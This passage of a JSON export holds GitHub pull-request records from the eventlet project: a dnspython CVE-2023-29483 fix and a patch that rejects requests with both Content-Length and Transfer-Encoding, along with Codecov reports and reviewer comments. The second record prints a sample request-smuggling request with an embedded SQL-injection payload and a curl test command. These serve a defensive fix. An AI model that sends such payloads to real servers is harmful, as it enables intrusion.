                "title": "for eventlet issue 913 - Dnspython 2.6.0rc1 dns.query.udp() API chang…",
                "labels": [
                    "security"
                ],
                "user": "kelvin-j-li",
                "issue_author_association": "CONTRIBUTOR",
                "number": 916,
                "id": 2134296152,
                "state": "closed",
                "project_created_at": "2024-02-14T12:56:50Z",
                "closed_at": "2024-02-19T13:42:27Z",
                "body": "…e heads-up #913",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) Report\nAttention: `12 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`b6f6e7c`)](https://app.codecov.io/gh/eventlet/eventlet/commit/b6f6e7c3a81853c2bf380f48bc0da7b894a3a903?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 56% compared to head [(`e21efb1`)](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 56%.\n\n| [Files](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Patch % | Lines |\n|---|---|---|\n| [eventlet/support/greendns.py](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#diff-ZXZlbnRsZXQvc3VwcG9ydC9ncmVlbmRucy5weQ==) | 33% | [10 Missing and 2 partials :warning: ](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@          Coverage Diff          @@\n##           master   #916   +/-   ##\n=====================================\n- Coverage      56%    56%   -1%     \n=====================================\n  Files          89     89           \n  Lines        9718   9728   +10     \n  Branches     1809   1812    +3     \n=====================================\n  Hits         5461   5461           \n- Misses       3883   3892    +9     \n- Partials      374    375    +1     \n```\n\n| [Flag](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flags&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Coverage Δ | |\n|---|---|---|\n| [ipv6](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `23% <22%> (-1%)` | :arrow_down: |\n| [py310asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py311asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py311epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py312asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <22%> (-1%)` | :arrow_down: |\n| [py312epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py37asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <22%> (-1%)` | :arrow_down: |\n| [py37epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py38asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py38epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py38openssl](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <22%> (-1%)` | :arrow_down: |\n| [py38poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py38selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py39dnspython1](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py39epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-14T15:54:57Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1944116544"
                    },
                    {
                        "body": "@kelvin-j-li do you plan to propose related unit test (see my previous suggestion), or can I merge this patch?",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-16T10:32:25Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948128668"
                    },
                    {
                        "body": "This fix is not enough, and the change at line 837 is a regression without the updated receive code.  The main fix for the CVE are [the changes to receive_udp in this commit](https://github.com/rthalley/dnspython/commit/f66e25b5f549acf66d1fb6ead13eb3cff7d09af3)\r\n\r\nI don't have a good unit test for these as they involve receiving various invalid things and ignoring them.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-16T13:04:35Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948353751"
                    },
                    {
                        "body": "I think eventlet changes should look a lot [like this branch](https://github.com/rthalley/eventlet/tree/tudoor)\r\n\r\nAlso, I added some unit tests to dnspython, see class [IgnoreErrors](https://github.com/rthalley/dnspython/blob/master/tests/test_query.py) if you want to adapt them.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-16T15:30:15Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948624734"
                    },
                    {
                        "body": "@rthalley: Thanks for details \r\n@kelvin-j-li: I let you acknowledge Bob's suggestions.",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-16T16:50:53Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948870731"
                    },
                    {
                        "body": "> @rthalley: Thanks for details @kelvin-j-li: I let you acknowledge Bob's suggestions.\r\n\r\nhi Hervé / Bob:\r\nyes, I agree with @rthalley. \r\n\r\nDo you prefer me to copy the code from https://github.com/rthalley/eventlet/tree/tudoor to this PR? I am ok with close this PR and use Bob's change/PR instead from https://github.com/rthalley/eventlet/tree/tudoor\r\n\r\nMany thanks!\r\n\r\n",
                        "user": "kelvin-j-li",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-19T01:36:32Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1951548007"
                    },
                    {
                        "body": "Hi @kelvin-j-li \r\n\r\nWe have to use the latest version of the Bob's branch with the `Truncated` changes included. AFAIK Bob designed a fix but do not proposed a pull request. If Bob is ok with copying his changes, you could copy his branch and then co-author the fix, else Bob could simply propose a pull request. \r\n\r\n@rthalley do you have any preference?\r\n  ",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T10:02:51Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952099761"
                    },
                    {
                        "body": "I didn't do a PR in part because I don't have time to write the tests; I mostly wanted to show the sort of thing that is needed to keep the CVE fix.   I'm ok with just copying from my branch.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-19T12:57:24Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952398437"
                    },
                    {
                        "body": "hi @4383 / @rthalley,\r\nI had copy Bob fix into this PR:\r\n\r\ncfe9b7b - (HEAD -> master, origin/master, origin/HEAD) Copied the complete fix for (CVE-2023-29483) and handling of truncated exceptions in greendns.py provided by Bob Halley from https://github.com/rthalley/eventlet/tree/tudoor\r\n\r\nthanks! ",
                        "user": "kelvin-j-li",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-19T13:18:55Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952435152"
                    },
                    {
                        "body": "Thanks guys (@kelvin-j-li, @rthalley) for the collaboration.\r\n\r\nThis patch LGTM, I'm going to merge it.",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T13:37:39Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952472285"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/eventlet/eventlet/pulls/916",
                    "merged_at": "2024-02-19T13:42:27Z"
                }
            },
            {
                "url": "https://github.com/eventlet/eventlet/pull/826",
                "title": "Fix security issue related to RFC 9112",
                "labels": [
                    "important",
                    "urgent",
                    "security"
                ],
                "user": "4383",
                "issue_author_association": "MEMBER",
                "number": 826,
                "id": 2037889523,
                "state": "closed",
                "project_created_at": "2023-12-12T14:36:56Z",
                "closed_at": "2024-01-11T15:05:25Z",
                "body": "Reject requests which contains headers `content-length` and `transfer-encoding` at the same time.\r\n\r\nThat's not allowed by RFC 9112 and that could lead to potential security attacks.\r\n\r\nhttps://www.rfc-editor.org/rfc/rfc9112#section-6.1-15\r\n\r\nThis is an extract of the RFC:\r\n\r\n> A server MAY reject a request that contains both Content-Length and\r\n> Transfer-Encoding or process such a request in accordance with the\r\n> Transfer-Encoding alone. Regardless, the server MUST close the\r\n> connection after responding to such a request to avoid the potential\r\n> attacks.\r\n\r\n> A server or client that receives an HTTP/1.0 message containing\r\n> a Transfer-Encoding header field MUST treat the message as if the\r\n> framing is faulty, even if a Content-Length is present, and close the\r\n> connection after processing the message. The message sender might have\r\n> retained a portion of the message, in buffer, that could be\r\n> misinterpreted by further use of the connection.\r\n\r\nThe following request would lead to this scenario:\r\n\r\n```\r\nPOST / HTTP/1.1\r\nHost: a.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\nContent-Type: application/x-\"##-form-urlencoded\r\n14\r\nid=1'or sleep(1);###\r\n0\r\n```\r\n\r\nWith these changes, when this kind of request is received the connection is closed and an error 400 is returned.\r\n\r\nThis scenario can be tested by using the following process:\r\n\r\n1. run a wsgi server either: \r\n- by using the wsgi sample in official examples (http://eventlet.net/doc/examples.html#wsgi-server) \r\n- or by using my previous patch (https://github.com/eventlet/eventlet/pull/825) that allow you to run wsgi server from the command line (`$ eventlet_wsgi_example`)\r\n2. send the following HTTP request to the running server:\r\n```\r\ncurl -d \"param1=value1&param2=value2\" -X POST -H 'Transfer-Encoding:\r\nchunked' -H 'Content-Length: 0' --http1.1 http://0.0.0.0:8090 -i\r\n```\r\n\r\nThe previous curl command display returned headers and status code. You can observe that now, with these changes, bad requests are rejected.\r\n\r\n These changes also remove `content-lenght` from the `chunk` tests to avoid reflecting something that's not a bad practice.\r\n\r\nThis security issue was originally discovered by Keran Mu (mkr22@mails.tsinghua.edu.cn) and Jianjun Chen\r\n(jianjun@tsinghua.edu.cn), from Tsinghua University and Zhongguancun Laboratory\r\n\r\nThanks to them for raising our attention about this security problem.",
                "comments": [
                    {
                        "body": "> From the RFC:\r\n> \r\n> > Early implementations of Transfer-Encoding would occasionally send both a chunked transfer coding for message framing and an estimated Content-Length header field for use by progress bars. This is why Transfer-Encoding is defined as overriding Content-Length, as opposed to them being mutually incompatible.\r\n> \r\n> Given that, should we maybe make this in some way configurable, but defaulting to the more-secure behavior? That would allow us an escape hatch for working with old clients that cannot be updated (for example, because their source code may have been lost), particularly if the operator and/or application developer know that the service will not be forwarding any messages.\r\n\r\nTotally agree with the \"configurable but defaulting to the more secure behavior\" path. I'll rework my patch to introduce an option.\r\n \r\n> \r\n> I'd also like to note that since we're relying on stdlib's HTTP parsing, there are still cases where a client may send both headers but we don't 400. See also: [python/cpython#81274](https://github.com/python/cpython/issues/81274) and #574 (which unfortunately I never properly followed up on).\r\n\r\nThanks for the heads up.\r\n\r\n> \r\n> That said, I agree, [the danger is certainly real](https://bugs.launchpad.net/swift/+bug/1840507).\r\n\r\n",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-12-14T10:00:11Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1855538257"
                    },
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) Report\nAttention: `6 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`dbb411d`)](https://app.codecov.io/gh/eventlet/eventlet/commit/dbb411d6a8531c52bf9507297e8d844f52d1d8ef?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 54% compared to head [(`457e760`)](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 54%.\n\n| [Files](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Patch % | Lines |\n|---|---|---|\n| [eventlet/wsgi.py](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#diff-ZXZlbnRsZXQvd3NnaS5weQ==) | 33% | [5 Missing and 1 partial :warning: ](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@          Coverage Diff          @@\n##           master   #826   +/-   ##\n=====================================\n- Coverage      54%    54%   -1%     \n=====================================\n  Files          88     88           \n  Lines        9744   9752    +8     \n  Branches     1814   1816    +2     \n=====================================\n- Hits         5296   5295    -1     \n- Misses       4082   4089    +7     \n- Partials      366    368    +2     \n```\n\n| [Flag](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flags&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Coverage Δ | |\n|---|---|---|\n| [ipv6](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `22% <11%> (-1%)` | :arrow_down: |\n| [py310epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py310poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py310selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py311epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py312epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <33%> (-1%)` | :arrow_down: |\n| [py37epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <33%> (-1%)` | :arrow_down: |\n| [py38epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py38openssl](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <33%> (-1%)` | :arrow_down: |\n| [py38poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py38selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39dnspython1](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <33%> (-1%)` | :arrow_down: |\n| [py39epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-12-14T11:13:46Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1855654256"
                    },
                    {
                        "body": "codecov is a bit flaky...",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-12-18T16:40:03Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1860998056"
                    },
                    {
                        "body": "@tipabu is the latest version is ok for you?",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-01-08T10:55:23Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1880777407"
                    },
                    {
                        "body": "If no answer in a few days should probably just proceed, given it's a security issue.",
                        "user": "itamarst",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-01-09T16:55:12Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1883424382"
                    },
                    {
                        "body": "> If no answer in a few days should probably just proceed, given it's a security issue.\r\n\r\nyes",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-01-10T15:22:21Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1885054329"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/eventlet/eventlet/pulls/826",
                    "merged_at": "2024-01-11T15:05:25Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 2,
        "num_security_issue_and_pull": 2,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/eventlet/eventlet/pull/916",
                "title": "for eventlet issue 913 - Dnspython 2.6.0rc1 dns.query.udp() API chang…",
                "labels": [
                    "security"
                ],
                "user": "kelvin-j-li",
                "issue_author_association": "CONTRIBUTOR",
                "number": 916,
                "id": 2134296152,
                "state": "closed",
                "project_created_at": "2024-02-14T12:56:50Z",
                "closed_at": "2024-02-19T13:42:27Z",
                "body": "…e heads-up #913",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) Report\nAttention: `12 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`b6f6e7c`)](https://app.codecov.io/gh/eventlet/eventlet/commit/b6f6e7c3a81853c2bf380f48bc0da7b894a3a903?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 56% compared to head [(`e21efb1`)](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 56%.\n\n| [Files](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Patch % | Lines |\n|---|---|---|\n| [eventlet/support/greendns.py](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#diff-ZXZlbnRsZXQvc3VwcG9ydC9ncmVlbmRucy5weQ==) | 33% | [10 Missing and 2 partials :warning: ](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@          Coverage Diff          @@\n##           master   #916   +/-   ##\n=====================================\n- Coverage      56%    56%   -1%     \n=====================================\n  Files          89     89           \n  Lines        9718   9728   +10     \n  Branches     1809   1812    +3     \n=====================================\n  Hits         5461   5461           \n- Misses       3883   3892    +9     \n- Partials      374    375    +1     \n```\n\n| [Flag](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flags&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Coverage Δ | |\n|---|---|---|\n| [ipv6](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `23% <22%> (-1%)` | :arrow_down: |\n| [py310asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py310selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py311asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py311epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py312asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <22%> (-1%)` | :arrow_down: |\n| [py312epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py37asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <22%> (-1%)` | :arrow_down: |\n| [py37epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py38asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py38epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py38openssl](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <22%> (-1%)` | :arrow_down: |\n| 